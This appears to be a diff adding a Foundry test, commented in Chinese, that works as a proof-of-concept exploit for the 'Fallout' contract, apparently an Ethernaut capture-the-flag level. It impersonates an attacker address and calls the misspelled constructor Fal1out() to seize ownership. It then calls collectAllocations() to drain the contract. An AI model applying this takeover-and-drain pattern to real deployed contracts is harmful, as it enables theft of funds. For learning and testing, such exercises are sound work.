@@ -1,0 +1,47 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "forge-std/Test.sol";
+import "../src/Fallout.sol"; // 引入受害合约
+
+contract FalloutPoCTest is Test {
+    Fallout public target;
+    
+    // 模拟黑客的 EOA 钱包地址
+    address public attacker = address(0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e);
+
+    function setUp() public {
+        // 1. 部署受害合约（模拟链上已存在的合约）
+        target = new Fallout();
+    }
+
+    function testExploit() public {
+        // ---------------------------------------------------------------------
+        // 步骤 0：切换交易发起人身份为黑客
+        // ---------------------------------------------------------------------
+        vm.startPrank(attacker);
+
+        // 验证攻击前的物理状态：初始 owner 不是黑客
+        emit log_named_address("Attacker Address", attacker);
+        emit log_named_address("Owner Before Attack", target.owner());
+
+        // ---------------------------------------------------------------------
+        // 步骤 1：物理越权 —— 直接调用拼错名称的普通公有函数 Fal1out()
+        // ---------------------------------------------------------------------
+        // EVM 控制流：Calldata 匹配选择器 0x6fab5dba -> PC 跳转 -> 执行 SSTORE 强刷 Slot 1
+        target.Fal1out();
+
+        // ---------------------------------------------------------------------
+        // 步骤 2：断言验证 —— 检查 Slot 1 (owner) 是否已被物理篡改为黑客地址
+        // ---------------------------------------------------------------------
+        assertEq(target.owner(), attacker);
+        emit log_named_address("Owner After Attack", target.owner());
+
+        // ---------------------------------------------------------------------
+        // 步骤 3：收尾清场 —— 以合法 Owner 身份调用提款函数，掏空合约余额
+        // ---------------------------------------------------------------------
+        target.collectAllocations();
+
+        vm.stopPrank();
+    }
+}
